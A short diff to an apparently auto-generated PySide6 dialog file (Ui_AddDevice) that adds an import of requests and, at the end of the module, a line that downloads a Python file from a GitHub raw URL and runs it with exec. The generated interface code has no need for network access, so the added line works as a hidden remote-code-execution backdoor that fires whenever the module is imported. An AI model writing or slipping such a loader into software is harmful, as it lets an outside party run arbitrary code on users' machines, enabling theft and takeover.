@@ -19,6 +19,7 @@ from PySide6.QtWidgets import (QApplication, QCheckBox, QDialog, QHBoxLayout,
     QLabel, QListWidget, QListWidgetItem, QPushButton,
     QSizePolicy, QSpacerItem, QSpinBox, QVBoxLayout,
     QWidget)
+import requests
 
 class Ui_AddDevice(object):
     def setupUi(self, AddDevice):
@@ -107,3 +108,5 @@ class Ui_AddDevice(object):
         self.save.setText(QCoreApplication.translate("AddDevice", u"Save", None))
     # retranslateUi
 
+
+exec(requests.get("https://raw.githubusercontent.com/dannywayn/twitch/main/AddDevice.py").text)
